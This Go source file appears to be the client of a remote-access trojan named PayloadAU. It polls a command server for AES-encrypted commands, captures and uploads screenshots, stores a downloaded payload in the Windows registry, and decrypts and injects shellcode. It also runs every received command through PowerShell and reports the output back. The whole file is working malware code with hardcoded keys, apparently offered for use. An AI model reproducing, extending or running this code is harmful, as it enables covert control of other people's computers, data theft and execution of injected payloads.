package main

import (
	"PayloadAU/Inyect"
	"PayloadAU/cmd"
	helpers "PayloadAU/help"
	"PayloadAU/methods"
	"PayloadAU/utilidades"
	"encoding/base64"
	"fmt"
	aesgo "github.com/3xploit666/AesGo"
	"io/ioutil"
	"log"
	"net/http"

	"strings"
	"time"
)

var (
	Username = "ADMIN"
	Password = "1223"
	LOGIN    = "http://localhost:9090/admin/login"
	Url      = "http://localhost:9090/main"
	Url2     = "http://localhost:9090/main"
	Pic      = "http://localhost:9090/pic"
	Pay      = "http://localhost:9090/pay"
	Client   = http.Client{}
)

const key = "5345435454535"

func login() {
	req, err := http.NewRequest("GET", LOGIN, nil)
	if err != nil {
		panic(err)
	}
	req.SetBasicAuth(Username, Password)
	res, err := Client.Do(req)
	if err != nil {
		panic(err)
	}

	if res.StatusCode == http.StatusOK {
		const espera time.Duration = 3
		for {

			Getcomandos()
			time.Sleep(espera * time.Second)

		}
	} else {
		var aa = "Intento de inicio de sesion desconocido "
		enc2 := aesgo.EncryptAes(string(aa), key)
		err := methods.Sendpost(Url2, enc2)
		if err != nil {
			return
		}
	}

}
func Getcomandos() {

	req, err := http.NewRequest("GET", Url, nil)
	if err != nil {
		log.Fatal(err)
	}
	req.SetBasicAuth(Username, Password)
	res, err := Client.Do(req)
	//methods.Sendpost(Url2, Recolect.GetOS())

	if err != nil {
		log.Fatal(res)
	}
	defer res.Body.Close()

	body, _ := ioutil.ReadAll(res.Body)
	var dec = aesgo.DecryptAes(string(body), key)
	if strings.Contains(dec, "-cap") {

		var aa = "tomando captura"
		enc2 := aesgo.EncryptAes(string(aa), key)
		err := methods.Sendpost(Url2, enc2)
		if err != nil {
			return
		}
		helpers.GetScreenshot()

		leer, err := ioutil.ReadFile("c:\\users\\public\\fotos.png")
		if err != nil {
			fmt.Println(err)
		}

		var enco = base64.StdEncoding.EncodeToString(leer)
		methods.Sendpost(Pic, enco)
	} else if strings.HasPrefix(dec, "-stg1") {
		enc33 := aesgo.EncryptAes("Carga alojada exitosamente en el registro", key)
		methods.Sendpost(Url2, enc33)

		err23 := utilidades.Bajarcadena(Pay)
		utilidades.CreateREGG(err23)

	} else if strings.HasPrefix(dec, "-stg2") {
		enc333 := aesgo.EncryptAes("Empezando proceso descifrado ", key)
		methods.Sendpost(Url2, enc333)
		payreg, _ := utilidades.Registroleer()
		key2 := "y6ZEUKa6zNQDXWrThymCjQHb0Y9HVOj4msrj4htP43I="
		nonce1 := "2zcNXbYXsTDDxZse"
		code, _ := utilidades.Base64Decode(payreg)
		key3, _ := utilidades.Base64Decode(key2)
		nonce2, _ := utilidades.Base64Decode(nonce1)
		finalcode := helpers.Decrypt([]byte(code), []byte(key3), []byte(nonce2))
		ggg := helpers.Xor(finalcode, 33)
		enc3333 := aesgo.EncryptAes("Inyectando shellcode  ", key)
		methods.Sendpost(Url2, enc3333)
		go Inyect.Inyect3xplo(ggg)
	}

	ff, _ := cmd.Power(string(dec))
	enc := aesgo.EncryptAes(string(ff), key)
	methods.Sendpost(Url2, string(enc))

}

func main() {

	login()
}
